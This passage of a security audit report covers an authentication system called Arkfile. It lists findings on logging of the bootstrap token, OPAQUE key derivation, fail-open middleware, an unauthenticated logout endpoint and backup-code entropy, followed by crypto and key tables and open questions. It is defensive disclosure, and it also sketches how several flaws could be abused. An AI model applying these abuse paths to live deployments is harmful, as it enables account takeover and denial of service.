**Description.** `CheckAndGenerateBootstrapToken` generates 32 random bytes and logs the hex-encoded token via `log.Printf`. journald retains by default; container runtimes capture stdout; operators paste it into ticketing systems.

**Evidence.**
```go
tokenHex := hex.EncodeToString(token)
log.Printf("[BOOTSTRAP] Admin Bootstrap Token: %s", tokenHex)
```

**Recommendation.**
1. Write the token to a mode-0600 file (path printed to stdout). Operator reads the file once and deletes it.
2. Stronger: accept a `--bootstrap-token-file` argument on `arkfile-admin` so the token never crosses a shell prompt or argv.
3. After successful first-admin login (per A-13), delete the file in addition to the in-DB token.

**Suggested tests.** Capture stdout during startup; assert no hex-encoded 64-char string appears.

---

### Finding A-27: OPAQUE server public key independently generated, not derived from the private key

- **Severity:** Medium
- **Confidence:** High
- **Category:** cryptographic / protocol correctness
- **Affected:** `auth/opaque.go:69-83`

**Description.** OPAQUE requires `pkS = derive(skS)`. The code generates two independent 32-byte random values:
```go
// Note: In a real OPAQUE implementation, public key should be derived from private key.
// However, preserving existing behavior of independent generation for now.

serverPrivateKey, err := km.GetOrGenerateKey("opaque_server_private_key", "opaque", 32)
...
serverPublicKey, err := km.GetOrGenerateKey("opaque_server_public_key", "opaque", 32)
```
The comment is honest. Whether libopaque actually consumes the stored `serverPublicKey` is the question: `wrap_opaque_create_registration_response` takes only `skS`, and libopaque derives `pkS` internally for inclusion in `rpub`. `wrap_opaque_create_credential_response` takes the user record (which already encodes server identity from registration). So the stored `serverPublicKey` is most likely **latent dead data** today — but any future feature (server-pubkey pinning, identity binding via pubkey hash, exporting `pkS` for cross-validation) will surface a value that does not match the actual key libopaque uses.

**Recommendation.**
1. Derive `serverPublicKey` from `serverPrivateKey` via `crypto_scalarmult_base`. Remove the second `GetOrGenerateKey`.
2. Delete the apologetic comment.
3. Audit every reader of `GetServerKeys()` to confirm none surfaces the mismatch.

**Suggested tests.** Assert `crypto_scalarmult_base(privateKey) == publicKey` at server startup; fail closed if not.

---

### Finding A-28: OPAQUE server identity hardcoded as `"server"`; not bound to deployment

- **Severity:** Medium
- **Confidence:** High
- **Category:** cryptographic / protocol correctness
- **Affected:**
  - `auth/opaque_multi_step.go:136-138` (`idS := []byte("server")`)
  - `auth/opaque_client.go:78-80, 173-175`

**Description.** OPAQUE's `idS` should encode "which Arkfile deployment is this" so a record from deployment A is not usable at deployment B even if both share the OPAQUE server key (key-rotation accident, backup restoration, compromise + clone). Arkfile uses `idS = []byte("server")` everywhere. The `ctx` is `"arkfile_auth"`, which is fine (application-level), but `idS` is the deployment-binding parameter.

**Evidence.** Grep `idS := []byte` in `auth/`.

**Recommendation.** Bind `idS` to deployment domain (from `BASE_URL` or `DOMAIN` env var; fall back to a deployment UUID generated at first run). Mirror in browser WASM, `arkfile-client`, and `arkfile-admin`. All four points must agree byte-for-byte — a single `crypto.LoadDeploymentID()` accessor the clients fetch via API or config is the right shape.

**Suggested tests.** Round-trip with `idS="server-A"` server vs `idS="server-B"` client; assert finalize fails.

---

### Finding A-29: Username comparisons are byte-wise; no Unicode normalization / case-folding policy

- **Severity:** Medium
- **Confidence:** High
- **Category:** identity binding / cryptographic
- **Affected:**
  - `models/user.go` (every `username = ?`)
  - `auth/opaque_multi_step.go:132` (`idU := []byte(username)`)
  - `auth/opaque_client.go:75`
  - `utils/username_validator.go`

**Description.** No NFC/NFKC normalization on input; no case-folding policy; the validator restricts character class but not Unicode form. Consequences:
- `Alice` and `alice` are different users.
- A username typed NFC in the browser but NFD by `arkfile-client` produces two distinct OPAQUE records.
- Confusables (Cyrillic `а` vs Latin `a`) bypass `ADMIN_USERNAMES` env checks.

The CLI side (`arkfile-admin/main.go:2784-2799`) does have a stricter validator (ASCII-class only), which mostly avoids confusables — but the server validator and the browser validator may not agree byte-for-byte.

**Recommendation.** Define a single normalization (NFC + restrict to ASCII alphanumeric + `_-.`). Apply at registration, at every lookup (`GetUserByUsername` normalizes before query), and at OPAQUE `idU` construction (browser, both CLIs, server). Audit `utils/username_validator.go` for parity.

**Suggested tests.** Round-trip NFC vs NFD username at registration vs login; assert consistent behaviour.

---

### Finding A-30: Refresh-token rotation revokes old token best-effort; failure does not abort new-token issuance

- **Severity:** Medium
- **Confidence:** High
- **Category:** authorization
- **Affected:** `handlers/auth.go:70-81`

**Description.**
```go
if err := models.RevokeRefreshToken(database.DB, request.RefreshToken); err != nil {
    // Log but don't fail - the old token will expire naturally
    logging.ErrorLogger.Printf("Warning: Failed to revoke old refresh token for %s: %v", username, err)
}

refreshToken, err := models.CreateRefreshToken(database.DB, username)
```
If revoke fails (network blip, RQLite leader election), the new refresh token is still issued. User now has TWO valid refresh tokens. Combined with A-10 (no reuse detection), an attacker who races a legitimate refresh splits the family undetected.

**Recommendation.** Wrap revoke + create in a single transaction; abort on revoke failure (return 503). User retries.

**Suggested tests.** Fault-injection: make revoke return an error; assert no new token is issued.

---

### Finding A-31: `TokenRevocationMiddleware` fails open when claims are missing or malformed

- **Severity:** Medium
- **Confidence:** High
- **Category:** authorization
- **Affected:** `auth/token_revocation.go:242-286`

**Description.** Lines 246-269 short-circuit to `next(c)` if `user` is nil, not a `*jwt.Token`, claims are not `*Claims`, or `token ID == ""`. The comments say "No token to check, proceed." Middleware is wired only behind `JWTMiddleware`, but if a route mis-registration ever runs it standalone, revocation is silently skipped.

**Recommendation.** Fail closed:
```go
if user == nil { return echo.NewHTTPError(http.StatusUnauthorized, "missing token") }
token, ok := user.(*jwt.Token); if !ok { return echo.NewHTTPError(http.StatusUnauthorized, "invalid token") }
claims, ok := token.Claims.(*Claims); if !ok { return echo.NewHTTPError(http.StatusUnauthorized, "invalid claims") }
if claims.ID == "" { return echo.NewHTTPError(http.StatusUnauthorized, "missing jti") }
```

---

### Finding A-32: `RateLimitMiddleware` fails open on backend errors

- **Severity:** Medium
- **Confidence:** High
- **Category:** operational / authorization
- **Affected:** `handlers/middleware.go:291-346`, `handlers/rate_limiting.go:411, 433, 456`

**Description.**
```go
if err != nil {
    logging.ErrorLogger.Printf("Rate limit check failed: %v", err)
    // Continue on error to avoid blocking legitimate requests
    return next(c)
}
```
A DB outage disables rate-limiting globally. Same pattern is in the TOTP rate-limit. An attacker who can degrade the rate-limit DB (saturating it via a non-rate-limited side-channel) drops the rate-limit floor on the whole system.

**Recommendation.** Fail-closed: return 503 to the caller. Distinguish "subsystem not initialised" (allow during warm-up) from "subsystem query failed" (deny / 503).

---

### Finding A-33: `/api/logout` requires no auth; refresh-token DoS via known-token revocation

- **Severity:** Medium
- **Confidence:** High
- **Category:** availability
- **Affected:**
  - `handlers/route_config.go:92` (no auth middleware on `/api/logout`)
  - `handlers/auth.go:100-139` (`Logout`)

**Description.** Logout takes `{ refresh_token: "..." }` in the body and revokes whatever matches. No JWT required. Attacker who briefly observes a victim's refresh token (e.g., A-11 log capture) revokes it — locks the victim out of their session.

**Recommendation.** Require an authenticated JWT; match the refresh token's owner to `claims.Username`; reject if mismatched.

**Suggested tests.** Submit a known refresh token to `/api/logout` without an Authorization header; assert 401.

---

### Finding A-34: `ApproveUser` trusts caller-supplied `adminUsername` parameter

- **Severity:** Medium
- **Confidence:** Medium
- **Category:** authorization / API-design smell
- **Affected:** `models/user.go:188-212`

**Description.** Signature accepts the acting admin's username as a string parameter; the check is `isAdminUsername(adminUsername)` against an env var. The intended caller (`handlers/admin.go:ApproveUser`) does extract the authenticated admin's username from the JWT, so it's currently safe. But the shape — a string parameter rather than an auth principal — invites future misuse. A CLI subcommand or batch job that hardcodes "admin" would silently bypass the check.

**Recommendation.** Refactor:
```go
func (u *User) ApproveUser(dbtx DBTX, actingAdmin *User) error {
    if !actingAdmin.HasAdminPrivileges() { ... }
    ...
}
```
The auth principal must be a typed object, not a name string.

---

### Finding A-35: `--password-stdin` and `--account-key-file` CLI flags do not exist; implicit pipe-stdin behaviour is undocumented and asymmetric

- **Severity:** Medium
- **Confidence:** High
- **Category:** design / operational
- **Affected:** `cmd/arkfile-client/main.go:1473-1541`, `cmd/arkfile-admin/main.go:2804-2843`

**Description.** Neither CLI advertises a `--password-stdin` flag. Both auto-detect piped stdin via `os.Stdin.Stat()`'s `ModeCharDevice` bit. Differences:
- `arkfile-client`: 10-second `PasswordTimeoutPipe`; returns `[]byte`; A-44 buffer-growth issue.
- `arkfile-admin`: NO timeout (can hang forever on a stuck pipe); returns `string` (A-3).

Neither tool has `--account-key-file` for the case where the user wants to skip the OPAQUE handshake using a pre-derived AccountKey. The agent is the only authorised caching path (A-21).

**Recommendation.**
1. Add explicit `--password-stdin` to both CLIs. Default no-flag remains interactive.
2. Match timeout behaviour across the two CLIs.
3. Document the pipe behaviour explicitly in `--help`.
4. If `--account-key-file` is desired: require mode 0600 (assert via `os.Stat` before read), on the same volume as `$HOME` (no cross-mount TOCTOU), zero the file after successful use.

---

### Finding A-36: CGO double-buffer pattern in `StoreUserRecord` is internally inconsistent

- **Severity:** Medium
- **Confidence:** High
- **Category:** memory-safety / CGO
- **Affected:** `auth/opaque_multi_step.go:66-105`

**Description.** Every other CGO entry in the package passes Go-allocated output buffers directly via `&buf[0]`. `StoreUserRecord` uses `C.CBytes(zeroedGoBuffer)` then `copy(goBuf, C.GoBytes(...))` to bring data back. The final `copy` line is what makes it work. If a future refactor removes that copy line by analogy with the other functions in the same file, the returned record is silently zero.

**Recommendation.** Rewrite to match the direct-pointer pattern:
```go
userRecord := make([]byte, OPAQUE_USER_RECORD_LEN)
ret := C.wrap_opaque_store_user_record(
    (*C.uint8_t)(cServerSecret),
    (*C.uint8_t)(cClientRecord),
    (*C.uint8_t)(unsafe.Pointer(&userRecord[0])),
)
```

**Suggested tests.** Existing OPAQUE round-trip test in `auth/dev_admin.go:273-374`.

---

### Finding A-37: `TOTPSkew = 0` contradicts its own comment and `idsrp.md` §22.2 expectation

- **Severity:** Medium (correctness — constant disagrees with documentation)
- **Confidence:** High
- **Category:** cryptographic / design
- **Affected:** `auth/totp.go:30`

**Description.**
```go
TOTPSkew = 0 // Allow ±0 window (60 seconds total: current + prev/next 30s windows = ±25s tolerance)
```
The comment describes `Skew = 1` behaviour (accepts previous, current, next windows). The constant is `0`, accepting only the current window. `idsrp.md` §22.2 calls for "±1 step". A user who types at second 29 of a window may have their code rejected at second 31 even though the authenticator still shows the same digits.

Security impact: `Skew = 0` is strictly stricter than `Skew = 1` — no extra attack surface. The concern is (a) the constant-vs-comment disagreement strongly suggests an unintentional misconfiguration; (b) usability friction drives users toward backup-code recovery (A-15) and replay-log churn.

**Recommendation.** Set `TOTPSkew = 1` per `idsrp.md` §22.2. Fix the comment. Explain why ±1 (not ±5): absorbs ≤30 s clock drift; replay-log (A-16) makes the expansion safe.

**Suggested tests.** Generate code; advance time 25 s; validate succeeds. Advance time 90 s; validate fails.

---

### Finding A-38: OPAQUE password buffer not zeroized in the C heap after CGO call

- **Severity:** Low
- **Confidence:** High
- **Category:** memory-safety / privacy
- **Affected:**
  - `auth/opaque_client.go:26-52` (`ClientCreateRegistrationRequest`)
  - `auth/opaque_client.go:120-146` (`ClientCreateCredentialRequest`)

**Description.** Password is copied into the C heap via `C.CBytes(password)`. `C.free` releases but does not zero. Bytes remain in heap memory until reclaimed. Used by `cmd/arkfile-client`, `cmd/arkfile-admin`, and `auth/dev_admin.go` — long-running processes where heap pages can leak via core dumps or memory inspection.

**Evidence.** `auth/opaque_client.go:36-37`:
```go
cPassword := C.CBytes(password)
defer C.free(cPassword)
```

**Recommendation.**
```go
func zeroAndFree(p unsafe.Pointer, n int) {
    if p != nil {
        C.memset(p, 0, C.size_t(n))
        C.free(p)
    }
}
```
Apply to every `C.CBytes(<sensitive>)`: password, OPRF secrets, export key copies.

---

### Finding A-39: `RequiresTOTPFromToken` panics on missing claims

**Status (2026-05-12):** **RESOLVED.** Landed with the A-01 fix. `auth/jwt.go` `RequiresTOTPFromToken` now uses `, ok :=` type assertions on both `c.Get("user")` and `userToken.Claims` and returns `false` (rather than panicking) when either is missing or the wrong type. Regression test: `TestRequiresTOTPFromToken_HandlesMissingClaims` in `auth/jwt_test.go` covers nil-user, nil-token-pointer, non-Claims claim type, and both valid `requires_totp=true`/`false` paths.

#### Original finding (preserved for the audit trail)


- **Severity:** Low
- **Confidence:** High
- **Category:** robustness
- **Affected:** `auth/jwt.go:144-149`

**Description.**
```go
func RequiresTOTPFromToken(c echo.Context) bool {
    user := c.Get("user").(*jwt.Token)         // panic if nil/wrong type
    claims := user.Claims.(*Claims)            // panic if not *Claims
    return claims.RequiresTOTP
}
```
A route mistakenly calling this without prior JWT middleware crashes. Echo's recover handles it but the panic-on-nil is the wrong shape.

**Recommendation.** Type-asserted fallthrough with conservative `false` return; ensure callers don't interpret `false` as "the token is full":
```go
user, ok := c.Get("user").(*jwt.Token); if !ok || user == nil { return false }
claims, ok := user.Claims.(*Claims); if !ok || claims == nil { return false }
return claims.RequiresTOTP
```

---

### Finding A-40: `ResetKeysForTest` exported in production code

- **Severity:** Low
- **Confidence:** High
- **Category:** code hygiene
- **Affected:** `auth/keys.go:65-72`

**Description.** A test helper that clears the loaded JWT key pair is exported in a `.go` file (not `_test.go`). Any package importing `auth` can call it at runtime.

**Recommendation.** Move to `auth/keys_test_helpers_test.go` or apply `//go:build test`.

---

### Finding A-41: `validateDevAdminAuthentication` lacks self-contained production-environment guard

- **Severity:** Low
- **Confidence:** High
- **Category:** defense-in-depth
- **Affected:** `auth/dev_admin.go:273-374`

**Description.** `CreateDevAdminWithOPAQUE` and `SetupDevAdminTOTP` have explicit production-env guards. `ValidateDevAdminAuthentication` does not — it relies on its callers to gate it.

**Recommendation.** Add the same triple-layer check at function entry.

---

### Finding A-42: Backup-code generation has modulo bias; tests log plaintext codes via `t.Logf`

- **Severity:** Low
- **Confidence:** High
- **Category:** cryptographic / logging hygiene
- **Affected:**
  - `auth/totp.go:36` (`BackupCodeCharset` — 26 chars)
  - `auth/totp.go:491-506` (`generateSingleBackupCode`)
  - `auth/totp_backup_test.go:43, 69` (`t.Logf` of raw codes)

**Description.** Generator reads one byte from `crypto/rand` per character and reduces `mod 26`. 256 = 9×26 + 22, so the first 22 charset characters have probability 10/256 and the last 4 have 9/256. Per-code entropy drops from log2(26^10) ≈ 47.0 to ~46.9 bits — small erosion but the wrong technique (rejection sampling is canonical). The tests at `t.Logf` emit raw plaintext codes to `go test -v` output, captured by CI.

Charset entropy itself (47 bits) is low. On GPU farms hashing the future-A-07-Argon2id-hashed form, 47 bits is brute-forceable in hours at typical Argon2id parameters. Going to 14 chars (~65 bits) is essentially free for the user.

**Recommendation.**
1. Rejection sampling: read a byte; if `>= 26 * floor(256/26) == 234`, discard. Or use `crypto/rand.Int(big.NewInt(int64(charsetLen)))`.
2. Remove `t.Logf` of raw codes. Log only truncated SHA-256 if a manual inspection log is useful.
3. Increase code length to 14 chars.

**Suggested tests.** Statistical: 10^6 codes; per-position character frequency within 2% of uniform.

---

### Finding A-43: `saveAuthSession` non-atomic on initial write; SIGINT during login can leave a partial file

- **Severity:** Low
- **Confidence:** High
- **Category:** robustness / operational
- **Affected:**
  - `cmd/arkfile-client/main.go:1182-1188` (initial save)
  - `cmd/arkfile-client/main.go:1321-1347` (`atomicSaveAuthSession`, refresh only)
  - `cmd/arkfile-admin/main.go:2615-2621` (no atomic variant exists)

**Description.** `arkfile-client` has two save functions: `os.WriteFile` (initial login) and `temp + Rename` (refresh). The non-atomic initial save leaves a truncated file if SIGINT'd. Subsequent `loadAuthSession` returns a JSON parse error and falls through to "no session" → re-login. Annoying but not security-critical. `arkfile-admin` has only the non-atomic version.

**Recommendation.** Replace both `saveAuthSession` and `saveAdminSession` with `atomicSaveAuthSession`. Add `fsync` of the temp file before close and `fsync` of the directory after rename.

---

### Finding A-44: Pipe-mode `readPassword` grows buffer via `append`; old buffer copies of partial password remain in heap

- **Severity:** Low
- **Confidence:** Medium
- **Category:** memory-safety / privacy
- **Affected:**
  - `cmd/arkfile-client/main.go:1513-1534`
  - `cmd/arkfile-admin/main.go:2823-2842`

**Description.** Both CLIs read pipe-mode password one byte at a time and `append` to a growing slice. `append` reallocates the backing array as capacity grows; old smaller arrays remain in heap until GC. Each contains a prefix of the password. `clearBytes(password)` (CLI side) only clears the final buffer.

**Recommendation.** Pre-allocate to a fixed maximum:
```go
passwordBytes := make([]byte, 0, 256)
```
Reject passwords longer than the maximum.

---

### Finding A-45: `crypto/opaque_validation.go` is a stub file

- **Severity:** Informational
- **Confidence:** High
- **Category:** design / code-hygiene
- **Affected:** `crypto/opaque_validation.go` (1 line, just `package crypto`)

**Description.** Empty file. Per AGENTS.md greenfield policy: delete or implement. The filename suggests it was meant to host validators for OPAQUE inputs (ristretto255 group-element validation on `M`, length checks before CGO, hex/base64 decoding with generic-error returns) — those validators would be a useful pre-CGO defense layer.

**Recommendation.** Either delete or implement.

---

## 3. Tables

### 3.1 Endpoint Review Table

| Endpoint | Auth required | Authorization rule | Sensitive inputs | Sensitive outputs | TOTP-gated? | Issues |
|---|---|---|---|---|---|---|
| `POST /api/opaque/register/response` | None (rate-limited) | None | username, M (32B) | session_id, rpub | N/A | DoS / OPAQUE-CPU surface before username-collision check (A-25). |
| `POST /api/opaque/register/finalize` | Session token | Session matches username | session_id, rrec | temp_token | N/A | A-25 enumeration via 409. |
| `POST /api/opaque/login/response` | None (rate-limited) | None | username, credential_request | session_id, credential_response | N/A | A-24 account enumeration. |
| `POST /api/opaque/login/finalize` | Session token | Session matches username | session_id, auth_u | temp_token (aud=arkfile-totp) | N/A | Temp token reaches protected routes (A-01). |
| `GET /api/opaque/health` | None | None | — | health status | N/A | OK. |
| `POST /api/admin/login/response` | None (rate-limited) | None | username, credential_request | session_id, credential_response | N/A | A-24 admin+user enumeration. |
| `POST /api/admin/login/finalize` | Session token | Session matches username + `is_admin` | session_id, auth_u | temp_token | N/A | OK once A-24 fixed. |
| `POST /api/bootstrap/register/response` | Bootstrap token | Localhost-only + token valid | bootstrap_token, registration_request | session_id, registration_response | N/A | Token in stdout (A-26); localhost depends on proxy config. |
| `POST /api/bootstrap/register/finalize` | Bootstrap token | Localhost-only + token valid + session | bootstrap_token, registration_record | temp_token | N/A | Token NOT consumed (A-13). |
| `POST /api/refresh` | Refresh token | Validate refresh token; check user-wide revoke | refresh_token | token, refresh_token | N/A | 122-bit entropy + no reuse detection (A-10). |
| `POST /api/logout` | **None** | None | refresh_token | — | N/A | **A-33** unauth DoS. |
| `POST /api/revoke-token` | Full JWT | User revokes own JTI | token, reason | — | Yes | OK. |
| `POST /api/revoke-all` | Full JWT | User revokes own refresh tokens | — | — | Yes | Does NOT revoke active JWTs (A-09). |
| `GET /api/totp/status` | Full JWT (`auth.Echo`) | Self only | — | enabled bool | Implicit (full JWT) | OK. |
| `POST /api/totp/reset` | Full JWT (`auth.Echo`) | Self + valid backup code | backup_code | new secret + new backup codes | Implicit | **A-15** unreachable from lost-device state; A-16 race during reset. |
| `POST /api/totp/setup` | Temp TOTP JWT | Self | — | secret, QR, 10 backup codes | (setup endpoint) | A-01 audience not enforced. A-42 backup-code entropy. |
| `POST /api/totp/verify` | Temp TOTP JWT | Self + valid first code | code | full JWT + refresh token | (verify endpoint) | A-37 Skew=0. A-20 no replay-log insert. |
| `POST /api/totp/auth` | Temp TOTP JWT | Self + `RequiresTOTP=true` claim + valid code/backup | code, is_backup | full JWT + refresh token | (auth endpoint) | A-08 no per-user lockout. A-16 backup-code race. A-07 backup-codes-encrypted-not-hashed. A-37 Skew=0. |
| `GET /api/admin-contacts` | **None** | Public | — | admin contact info | N/A | Public admin-username surface; review in Slice E. |
| `/api/admin/*` | Full JWT | `AdminMiddleware` (localhost + `is_admin`) | varies | varies | **No** | **A-02** temp token works. |
| `/api/admin/dev-test/*` | Full JWT + admin + env var | (env var only — no prod check) | varies | TOTP-decrypt oracle, user delete | Conditional | **A-14**. |

### 3.2 Cryptographic Operations Table

| Operation | Primitive | Key source | Nonce/IV | AAD | Storage | Issues |
|---|---|---|---|---|---|---|
| JWT signing | Ed25519 | KeyManager `jwt_signing_key_v1` (32B seed) | n/a | n/a | `system_keys` | Same key for temp + full (A-01). |
| OPAQUE registration | libopaque (Ristretto255, OPRF, HKDF-SHA512, AKE) | KeyManager `opaque_server_private_key`; `opaque_oprf_seed`; independent `opaque_server_public_key` (A-27) | per-handshake | `idU`, `idS="server"` (A-28), `ctx="arkfile_auth"` | `system_keys` + `opaque_user_data` | A-27 pkS not derived; A-28 idS hardcoded. |
| OPAQUE login | libopaque | same | per-handshake | same | `opaque_auth_sessions` (15-min TTL) | OK. |
| Bootstrap token | `crypto/rand` 32B + hex | system_keys + stdout (A-26) | n/a | n/a | `system_keys` + stdout | A-13 not consumed. |
| Refresh token | `uuid.NewV4()` (122-bit) | n/a | n/a | n/a | `refresh_tokens.token_hash` | A-10. |
| TOTP secret generation | `crypto/rand` 20B = 160 bits | server at enrollment | n/a | n/a | base32 string, encrypted (see below) | OK. |
| TOTP secret encryption | AES-256-GCM | HKDF-SHA256(`totpMasterKey`, info="ARKFILE_TOTP_USER_KEY:<username>") | per-EncryptGCM random | none | `user_totp.secret_encrypted` | A-18 master-key co-location. No AAD (Slice B). |
| TOTP backup-code generation | `crypto/rand` byte `mod 26` per char | server at enrollment | n/a | n/a | plaintext JSON, then encrypted | A-42 modulo bias, ~47-bit entropy. |
| TOTP backup-code storage | AES-256-GCM (same key) | same | per-EncryptGCM random | none | `user_totp.backup_codes_encrypted` | **A-07** encrypted not hashed. |
| TOTP code verification | pquerna/otp `ValidateCustom` (HMAC-SHA1, 30s, 6 digits) | per-user TOTP secret (derived) | n/a | n/a | n/a | **A-37** Skew=0 vs ±1. |
| TOTP replay log entry | SHA-256(code) + window_start | n/a | n/a | n/a | `totp_usage_log` (no UNIQUE) | A-16 (less severe for codes; bounded by window). |
| Backup-code replay log entry | SHA-256(code) | n/a | n/a | n/a | `totp_backup_usage` (no UNIQUE) | **A-16** race. |
| TOTP master key load | KeyManager `totp_master_key_v1` (32B) | first-run `crypto/rand` | n/a | n/a | `system_keys` (encrypted at rest — Open Question 1) | A-17 in-memory hygiene; A-18 co-location. |
| CLI agent AccountKey | raw bytes | sent over Unix socket | n/a | n/a | RAM (mlock best-effort, no MADV_DONTDUMP) | A-21. |
| CLI agent session-binding hash | SHA-256(access_token) | derived from server JWT | n/a | n/a | RAM | OK. |
| CLI `--totp-secret` argv | (no crypto; raw secret bytes) | flag | n/a | n/a | n/a | **A-06**. |
| Browser localStorage tokens | bearer tokens | server-issued | n/a | n/a | `localStorage` `token`, `refresh_token` | **A-05** XSS-readable. |
| Browser password during TOTP | plaintext | `<input>.value` | n/a | n/a | `window.totpLoginData.password` | **A-04** global exposure. |
| Browser clientSecret (OPAQUE intermediate) | OPAQUE state | from `getOpaqueClient().loginInit` | n/a | n/a | `sessionStorage` (`login_secret`) | OK; tab-scoped, cleared on success. |

### 3.3 Key Hierarchy Table

| Key | Generated where | Entropy source | Storage | Leaves client? | Encrypts/authenticates | Rotation | Destruction | If compromised |
|---|---|---|---|---|---|---|---|---|
| OPAQUE server private key (skS) | Server, KeyManager at first run | `crypto/rand` 32B | `system_keys` (at-rest encryption — Open Q1) | No | OPAQUE registration responses | Manual; no automation | KeyManager `DeleteKey` (zeroization unverified) | Server impersonation at new registrations; existing OPAQUE records remain confidential per OPAQUE design. |
| OPAQUE server public key (pkS) | Server, KeyManager — **independently generated, NOT derived** (A-27) | `crypto/rand` 32B | `system_keys` | No | Dead data today | n/a | n/a | n/a (dead). |
| OPAQUE OPRF seed | Server, KeyManager | `crypto/rand` 32B | `system_keys` | No | OPRF blinding | None | n/a | Offline password guessing against stolen DB. Per `idsrp.md` §4.4 confirm separate-volume storage (Open Q1). |
| Ed25519 JWT signing key | Server, KeyManager | `crypto/rand` 32B seed | `system_keys` | No | All JWTs (temp + full, same key — A-01) | Manual; `scripts/maintenance/rotate-jwt-keys.sh` | KeyManager | All JWTs forgeable; revoke + force re-login. |
| Bootstrap token | Server at first run | `crypto/rand` 32B | `system_keys` (transient) + stdout (A-26) | No (operator captures) | First admin registration | One-shot intended; not enforced (A-13) | `DeleteKey` after first admin login | Unauthorised second admin during bootstrap window. |
| Refresh token | Server at login | **`uuid.NewV4()`** (122-bit) — A-10 | Hashed (SHA-256) in `refresh_tokens` | Yes | Renewable session | Rotated on every `/api/refresh` (best-effort, A-30) | DB row deleted on revoke/expiry | Long-lived session; no reuse detection (A-10). |
| Per-JTI revocation entry | Server on revoke | n/a | `revoked_tokens` | No | Marks specific JWT revoked | n/a | DB cleanup on expiry | n/a |
| User-wide revocation entry | Server on force-logout | n/a | `revoked_tokens` `token_id="user-revoke:<u>:<ts>"` | No | Invalidates all JWTs issued before `<ts>` | n/a | DB cleanup | n/a; A-09 means not enforced per-request. |
| OPAQUE export key | Client+server during OPAQUE | OPAQUE-internal HKDF | Discarded (unused) | Returned to client by libopaque, ignored | nothing today | n/a | n/a | n/a (dead). |
| TOTP master key | Server, KeyManager at first init | `crypto/rand` 32B | `system_keys` (A-18 co-location); in-memory copy never zeroed, no mlock, no MADV_DONTDUMP (A-17) | No | HKDF-derives per-user TOTP keys | None (no rotation procedure — A-18) | Process exit only | Every TOTP secret + backup code recoverable in plaintext (A-07). |
| Per-user TOTP encryption key | Server, derived on demand | HKDF-SHA256(`totpMasterKey`, info="ARKFILE_TOTP_USER_KEY:<username>") | Stack/heap for one call; `SecureZeroTOTPKey` on defer | No | TOTP secret (AES-GCM) + backup codes (AES-GCM) | Re-derived per call | Cleared on function return | Per-user secret + codes plaintext. |
| TOTP shared secret (per user) | Server, `crypto/rand` 20B at enrollment | 160 bits | `user_totp.secret_encrypted` (AES-GCM under per-user TOTP key) | Yes (returned once at enrollment as base32+QR) | Live TOTP code generation | Manual via `/api/totp/reset` (unreachable from lost-device state — A-15) | DB row deleted on user delete (incomplete — A-12) | Attacker generates valid TOTP codes indefinitely. |
| TOTP backup codes (10 per user) | Server, charset-rand at enrollment | A-42 modulo bias, ~47-bit per code | `user_totp.backup_codes_encrypted` (AES-GCM under per-user TOTP key) | Yes (returned once at enrollment) | Single-use TOTP-bypass (A-16 race; A-07 encrypted not hashed) | Regenerated via `/api/totp/reset` | DB row replaced on reset | 10 TOTP-bypass tickets per user. |
| CLI agent AccountKey | Client, Argon2id over password (Slice B) | Argon2id | RAM only; mlock best-effort; no MADV_DONTDUMP (A-21); 1-4 hour TTL | Local (CLI ↔ agent) | Wraps FEKs (Slice C); encrypts metadata (Slice B) | Re-derived per login | `wipeAllSensitiveDataLocked` zeroes | All files decryptable. |
| CLI agent session-token hash | Client, SHA-256(access_token) | derived | RAM in agent | n/a | Session binding | Not propagated through refresh-rotation (Open Q4) | Cleared on wipe | Bypass session binding. |
| CLI session file | Client, post-login | n/a | `~/.arkfile-session.json` (mode 0600; non-atomic initial save — A-43) | No | Stores access_token, refresh_token, expires_at, username, server_url | Refreshed atomically via temp+rename | `clear` subcommand | Local session takeover. |
| Browser localStorage tokens | Server-issued, stored client-side | n/a | `localStorage` `token`, `refresh_token` (A-05) | No | n/a | Replaced on every `setTokens` call | `clearTokens` removes on explicit logout | XSS-readable; takeover persists up to 14 days via refresh rotation. |
| Browser `window.totpLoginData.password` | Browser, from `<input>.value` | n/a | `window` global during TOTP flow (A-04) | No | n/a | "Wiped" by `password = ''` (JS strings cannot be zeroed) | Same as above | Plaintext password exfiltration via same-origin script. |

---

## 4. N/A items

| `idsrp.md` item | Status | Justification |
|---|---|---|
| Password change / password reset flow (§15) | **N/A** | No password-change endpoint, no email/SMS verification, no "forgot password" flow. OPAQUE + Arkfile's no-PII stance means forgotten password = lost account. Consistent with documented design; should be explicitly user-facing-documented. |
| Recovery codes other than TOTP backup (§15) | **N/A** | Only TOTP backup codes exist. |
| Device enrollment / per-device session listing (§15) | **N/A** | Refresh tokens are not tied to a device-identifier. No device-management UI. |
| Multi-tenant separation (§8) | **N/A** | Single-tenant. |
| OPAQUE export key usage (§4.3) | **Latent N/A** | libopaque returns it; both server and browser ignore it. If wired up in the future for KEK derivation, the threat model changes and a new audit is needed. |
| `--account-key-file` mode / TOCTOU (§22.1) | **Flag does not exist (A-35)** | Documented as absent. |
| Browser WASM SRI / integrity | **Deferred to Slice F** | No obvious gap observed in the auth-flow read; deep audit belongs to F. |

---

## 5. Open Questions for the developer

1. **`KeyManager` at-rest encryption.** `system_keys` rows are presumably encrypted by a KEK that `KeyManager` holds. Where on disk is that KEK? Is it on the same volume as the RQLite DB file? `.clinerules` forbids the auditor from reading `/opt/arkfile/etc/**`. Please confirm so A-18's severity can be finalised.
2. **Caddyfile trusted-proxy configuration.** A-02, A-13, A-14, A-26 all depend on `c.RealIP()` correctly returning the originating client IP. Please confirm `Caddyfile.prod` sets `trusted_proxies` / `X-Forwarded-For` policy so a remote attacker cannot spoof a localhost IP. Slice F will verify but pre-flagging accelerates the review.
3. **JWT TTL default.** `utils.GetJWTTokenLifetime()` is used in `GenerateToken` and `GenerateFullAccessToken`. What is the default and what env var overrides it? If it can be set to hours, A-09's gap widens proportionally.
4. **CLI agent + refresh-token rotation.** The agent caches the session-token hash but the CLI side does not push a new hash to the agent on `refreshSessionToken`. Confirmed: the new access token's hash won't match the agent's stored hash — the next `get_account_key` triggers `wipeAllSensitiveDataLocked`, forcing re-login. Is this the intended behaviour, or should `refreshSessionToken` notify the agent to update its `tokenHash`?
5. **`utils.IsProductionEnvironment` definition.** Slice F will read it; if it's an env-var check (`ARKFILE_ENV=production`), then operator misconfiguration defeats every "blocked in production" check. A build-tag approach is structurally stronger.
6. **TOTP master key rotation.** No `scripts/maintenance/rotate-totp-keys.sh` exists. Is rotation planned? It must re-derive every user's encrypted blob under the new master key in a single transaction.
